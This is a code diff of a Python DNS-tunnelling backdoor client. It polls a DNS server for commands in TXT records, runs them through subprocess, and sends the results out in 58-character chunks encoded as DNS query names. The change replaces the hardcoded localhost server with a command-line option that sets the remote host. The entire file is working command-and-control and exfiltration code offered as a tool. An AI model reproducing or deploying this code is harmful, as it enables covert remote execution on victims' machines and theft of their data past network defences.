@@ -5,10 +5,9 @@ from Crypto.Cipher import AES
 import subprocess, os
 import dns.resolver
 import textwrap, base64
-import re
- 
-HOST = '127.0.0.1'
-PORT = 53
+import re, logging
+from optparse import OptionParser
+
 TLD = 'com'
 NXT_CMD = 'nxt'
 ANSWER = ';ANSWER'
@@ -45,11 +44,11 @@ nextCommand = base64.b64encode(NXT_CMD)
 def formURL(cmd):
   return '{}.{}'.format(cmd, TLD)
 
-def startConnection():
+def startConnection(host):
   ## Query fake dns server for commands to run:
   url = formURL(nextCommand)
   request = dns.message.make_query(url, dns.rdatatype.TXT)
-  answers = dns.query.udp(request, HOST)
+  answers = dns.query.udp(request, host)
   a = answers.to_text()
   return a
 
@@ -107,11 +106,11 @@ def runCmd(cmd):
 
   return output
 
-def dnsMakeQuery(url):
+def dnsMakeQuery(url, host):
   feedback_request = dns.message.make_query(url, dns.rdatatype.A)
-  dns.query.udp(feedback_request, HOST)
+  dns.query.udp(feedback_request, host)
 
-def sendOutputToServer(output):
+def sendOutputToServer(output, host):
   send =''
   output_end = len(output)
   for chunk in output:
@@ -120,19 +119,50 @@ def sendOutputToServer(output):
     # Send 58 charcter chunks:
     if len(send) == 58:
       url = formURL(send)
-      dnsMakeQuery(url)
+      dnsMakeQuery(url, host)
       send =''
     # Send out final chunk:
     if output_end == 0:
       url = formURL(send)
-      dnsMakeQuery(url)
+      dnsMakeQuery(url, host)
 
-def main():
+def start(host):
   while 1:
-    a = startConnection()
+    a = startConnection(host)
     cmd = parseCmd(a)
     stdoutput = runCmd(cmd)
-    sendOutputToServer(stdoutput)
+    sendOutputToServer(stdoutput, host)
+
+def main():
+  # Setup the command line arguments.
+  optp = OptionParser()
+
+  # Output verbosity options
+  optp.add_option('-q', '--quiet', help='set logging to ERROR',
+                  action='store_const', dest='loglevel',
+                  const=logging.ERROR, default=logging.INFO)
+  optp.add_option('-d', '--debug', help='set logging to DEBUG',
+                  action='store_const', dest='loglevel',
+                  const=logging.DEBUG, default=logging.INFO)
+  optp.add_option('-v', '--verbose', help='set logging to COMM',
+                  action='store_const', dest='loglevel',
+                  const=5, default=logging.INFO)
+
+  # Option to query a specific server
+  optp.add_option("-s", "--server", dest="host",
+                  help="DNS server to query")
+
+  opts, args = optp.parse_args()
+
+  # Setup logging.
+  logging.basicConfig(level=opts.loglevel,
+                      format='%(levelname)-8s %(message)s')
+
+  if opts.host is None:
+    opts.host = raw_input("DNS server to query: ")
+
+  start(opts.host)
+
 
 if __name__ == '__main__':
   main()
